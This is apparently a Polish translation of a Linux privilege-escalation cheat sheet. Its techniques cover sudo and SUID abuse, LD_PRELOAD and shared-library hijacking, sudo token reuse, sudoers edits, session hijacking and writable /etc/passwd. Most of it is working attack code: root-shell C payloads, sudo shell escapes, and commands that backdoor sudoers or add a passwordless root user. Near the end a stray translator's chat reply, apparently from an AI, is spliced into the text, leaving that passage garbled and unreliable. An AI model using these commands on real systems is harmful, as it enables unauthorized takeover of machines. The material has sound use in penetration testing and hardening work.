D-Bus działa na zasadzie **allow/deny model**, zarządzając uprawnieniami wiadomości (wywołania metod, emisje sygnałów itp.) na podstawie skumulowanego efektu dopasowujących się reguł polityki. Te polityki określają interakcje z bus, co potencjalnie może umożliwić privilege escalation poprzez wykorzystanie tych uprawnień.

Przykład takiej polityki w `/etc/dbus-1/system.d/wpa_supplicant.conf` został podany, opisując uprawnienia dla użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie uniwersalnie, podczas gdy polityki z kontekstem "default" dotyczą wszystkich nieobjętych innymi, bardziej szczegółowymi politykami.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się, jak enumerate i exploit D-Bus communication tutaj:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć i ustalić pozycję maszyny.

### Ogólne enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Zawsze sprawdź network services uruchomione na maszynie, z którymi nie mogłeś wchodzić w interakcję przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz przechwycić jakieś credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź, kim jesteś, jakie masz **privileges**, którzy **users** są w systemach, którzy mogą **login** i którzy mają **root privileges**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuksa były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Wykorzystaj to używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać Ci root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

Jeśli **znasz jakiekolwiek hasło** w środowisku, **spróbuj zalogować się jako każdy użytkownik** używając tego hasła.

### Su Brute

Jeśli nie przeszkadza Ci generowanie dużo hałasu i na komputerze są dostępne binaria `su` i `timeout`, możesz spróbować przeprowadzić brute-force użytkownika używając [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) z parametrem `-a` również próbuje brute-force'ować użytkowników.

## Nadużycia zapisywalnego $PATH

### $PATH

Jeśli odkryjesz, że możesz **zapisywać w jakimś katalogu znajdującym się w $PATH**, możesz być w stanie eskalować uprawnienia przez **utworzenie backdoora w zapisywalnym katalogu** o nazwie odpowiadającej komendzie, która zostanie wykonana przez innego użytkownika (najlepiej root) i która **nie jest ładowana z katalogu znajdującego się wcześniej** niż twój zapisywalny katalog w $PATH.

### SUDO and SUID

Możesz mieć pozwolenie na wykonanie pewnej komendy za pomocą sudo lub plik może mieć ustawiony bit suid. Sprawdź to używając:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają na odczyt i/lub zapis plików lub nawet wykonanie polecenia.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja sudo może pozwolić użytkownikowi na uruchomienie pewnego polecenia z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`, dzięki czemu uzyskanie powłoki jest trywialne przez dodanie ssh key do root directory lub wywołanie `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **set an environment variable** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na HTB machine Admirer**, był **podatny** na **PYTHONPATH hijacking**, co pozwalało na załadowanie dowolnej biblioteki python podczas wykonywania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowane przez sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Dlaczego to działa: Dla nieinteraktywnych powłok Bash odczytuje `$BASH_ENV` i wykonuje (sources) ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowane przez sudo, twój plik zostanie załadowany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny target, który wywołuje `/bin/bash` w trybie nieinteraktywnym, lub dowolny bash script).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Umacnianie:
- Usuń `BASH_ENV` (oraz `ENV`) z `env_keep`; stosuj `env_reset`.
- Unikaj wrapperów powłoki dla poleceń dozwolonych przez sudo; używaj minimalnych binarek.
- Rozważ logowanie I/O przez sudo i powiadamianie, gdy używane są zachowane zmienne środowiskowe.

### Ścieżki omijania wykonywania sudo

**Przejdź** aby przeczytać inne pliki lub użyj **symlinków**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

Jeśli **sudo permission** jest nadane dla pojedynczego polecenia **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ta technika może być również użyta, jeśli **suid** binary **wykonuje inne polecenie bez określenia jego ścieżki (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnego SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary z podaną ścieżką do polecenia

Jeśli **suid** binary **wykonuje inne polecenie, podając ścieżkę**, możesz spróbować **wyeksportować funkcję** nazwaną tak, jak polecenie, które wywołuje suid file.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Następnie, gdy wywołasz suid binary, ta funkcja zostanie wykonana

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do określenia jednej lub więcej bibliotek współdzielonych (pliki .so), które mają zostać załadowane przez loader przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces jest znany jako wstępne ładowanie biblioteki.

Jednakże, aby utrzymać bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku plików wykonywalnych **suid/sgid**, system narzuca pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla plików wykonywalnych, w których realny identyfikator użytkownika (_ruid_) nie zgadza się z efektywnym identyfikatorem użytkownika (_euid_).
- Dla plików wykonywalnych z suid/sgid, preloadowane są jedynie biblioteki znajdujące się w standardowych ścieżkach, które same są suid/sgid.

Privilege escalation może wystąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo` i wynik `sudo -l` zawiera stwierdzenie **env_keep+=LD_PRELOAD**. Ta konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** była zachowana i rozpoznawana nawet wtedy, gdy polecenia są uruchamiane z użyciem `sudo`, co potencjalnie może prowadzić do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **skompiluj to** używając:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** running
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może zostać wykorzystany, jeśli atakujący kontroluje env variable **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natkniesz się na binary z uprawnieniami **SUID**, które wydają się nietypowe, dobrą praktyką jest sprawdzenie, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje możliwość eksploatacji.

Aby to wykorzystać, należy stworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulację uprawnieniami plików i uruchomienie shella z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) za pomocą:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
W końcu uruchomienie podatnego SUID binary powinno wywołać exploit, umożliwiając potencjalne przejęcie systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Teraz, gdy znaleźliśmy SUID binary, który ładuje library z folderu, do którego mamy uprawnienia zapisu, utwórzmy library w tym folderze pod odpowiednią nazwą:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi posiadać funkcję o nazwie `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. [**GTFOArgs**](https://gtfoargs.github.io/) is the same but for cases where you can **możesz tylko wstrzykiwać argumenty** in a command.

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

W przypadkach, kiedy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia przez **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokenu sudo, który pozwala używać `sudo` bez wprowadzania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` jest 0
- `gdb` jest dostępny (możesz go wgrać)

(Możesz tymczasowo włączyć `ptrace_scope` z `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub trwale modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_ **owned by root with setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, który sprawi, że **sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeżeli masz **write permissions** w folderze lub na którymkolwiek z utworzonych w nim plików, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **obtain sudo privileges** bez potrzeby znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki w katalogu `/etc/sudoers.d` określają, kto może używać `sudo` i w jaki sposób. Te pliki **domyślnie mogą być odczytywane tylko przez użytkownika root i grupę root**.\
**Jeśli** możesz **odczytać** ten plik, możesz być w stanie **uzyskać przydatne informacje**, a jeśli możesz **zapisać** dowolny plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją alternatywy dla binarki `sudo`, takie jak `doas` w OpenBSD — pamiętaj, aby sprawdzić jego konfigurację w /etc/doas.conf
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** do eskalacji uprawnień i uzyskałeś powłokę w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny o nazwie sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie, **zmodyfikuj $PATH** kontekstu użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, twój plik sudo został uruchomiony.

Zwróć uwagę, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifies `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś w rodzaju:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą ładowane pliki konfiguracyjne**. Zazwyczaj plik zawiera następującą linię: `include /etc/ld.so.conf.d/*.conf`

To oznacza, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **Oznacza to, że system będzie szukał bibliotek w katalogu `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia zapisu** na którejkolwiek z wymienionych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, na dowolny plik w `/etc/ld.so.conf.d/` lub na dowolny katalog wskazany w plikach w `/etc/ld.so.conf.d/*.conf`, może być w stanie eskalować uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, zostanie ona użyta przez program w tym miejscu, określonym przez zmienną `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień roota dla procesu**. To efektywnie dzieli uprawnienia roota na **mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przydzielić procesom. W ten sposób pełny zestaw uprawnień zostaje zredukowany, zmniejszając ryzyko ich wykorzystania.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je wykorzystać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu, **bit for "execute"** oznacza, że użytkownik może **"cd"** do folderu.\
Bit **"read"** oznacza, że użytkownik może **list** **files**, a bit **"write"** oznacza, że użytkownik może **delete** i **create** nowe **files**.

## ACLs

Access Control Lists (ACLs) reprezentują drugą warstwę uprawnień dyskrecjonalnych, zdolną do **nadpisywania tradycyjnych ugo/rwx permissions**. Te uprawnienia zwiększają kontrolę dostępu do pliku lub katalogu, pozwalając lub odmawiając praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia precyzyjniejsze zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Nadaj** użytkownikowi "kali" read i write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL-ami z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwieranie shell sessions

W **starych wersjach** możesz **hijack** jakąś **shell** session innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **connect** tylko do screen sessions należących do **własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz session**.

### screen sessions hijacking

**Wypisz screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

To był problem w przypadku **starych wersji tmux**. Nie byłem w stanie hijack a tmux (v2.1) session utworzonej przez root jako nieuprzywilejowany użytkownik.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sprawdź **Valentine box z HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, etc) pomiędzy wrześniem 2006 a 13 maja 2008 mogą być dotknięte tym błędem.\
Ten błąd występuje podczas tworzenia nowego ssh key w tych systemach, ponieważ **możliwych było tylko 32,768 wariantów**. Oznacza to, że wszystkie możliwości można obliczyć i **mając ssh public key możesz wyszukać odpowiadający private key**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Określa, czy uwierzytelnianie hasłem jest dozwolone. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy public key authentication jest dozwolone. Domyślnie `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustym hasłem. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może logować się przez ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się zalogować używając hasła i private key
- `without-password` or `prohibit-password`: root może logować się tylko przy użyciu private key
- `forced-commands-only`: root może się zalogować tylko używając private key i jeśli opcje commands są określone
- `no` : nie

### AuthorizedKeysFile

Określa pliki zawierające public keys, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki absolutne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja spowoduje, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna public key twojego key z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci **use your local SSH keys instead of leaving keys** (without passphrases!) pozostawionych na twoim serwerze. Dzięki temu będziesz mógł **jump** via ssh **to a host** i stamtąd **jump to another** host **using** the **key** located in your **initial host**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:
```
Host example.com
ForwardAgent yes
```
Zwróć uwagę, że jeśli `Host` to `*`, za każdym razem gdy użytkownik połączy się z inną maszyną, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub zabronić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwalać** lub **zabraniać** ssh-agent forwarding przy użyciu słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz być w stanie wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Ciekawe pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są uruchamiane, gdy użytkownik uruchamia nową powłokę**. W związku z tym, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś dziwny skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych informacji**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć kopia zapasowa. Dlatego zaleca się **znaleźć je wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy w plikach znajdują się hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisowalny /etc/passwd

Najpierw wygeneruj hasło jednym z następujących poleceń.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Proszę wklej zawartość pliku src/linux-hardening/privilege-escalation/README.md, a przetłumaczę go na polski zachowując dokładnie tę samą składnię markdown i html. Czy chcesz też, żeby dodać w pliku linię tworzącą użytkownika `hacker` z wygenerowanym hasłem? Jeśli tak, podaj wymagania dotyczące hasła (długość, dozwolone znaki) albo potwierdź, że mam wygenerować silne hasło i wstawić je jawnie.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać użytkownika tymczasowego bez hasła.\
UWAGA: może to obniżyć poziom bezpieczeństwa maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: Na platformach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` został przemianowany na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać w niektórych wrażliwych plikach**. Na przykład, czy możesz zapisać w jakimś **pliku konfiguracyjnym usługi**?
```bash
